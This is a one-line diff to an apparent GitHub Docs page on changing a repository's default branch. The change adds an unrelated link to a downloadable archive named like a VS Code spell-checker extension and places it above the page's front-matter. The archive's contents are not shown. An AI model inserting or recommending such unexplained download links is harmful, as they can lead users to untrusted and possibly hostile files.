@@ -1,3 +1,4 @@
+[vscode-spell-checker-2.0.1-alpha.5.tar.gz](https://github.com/github/docs/files/6782678/vscode-spell-checker-2.0.1-alpha.5.tar.gz)
 ---
 title: Changing the default branch
 intro: 'If you have more than one branch in your repository, you can configure any branch as the default branch.'
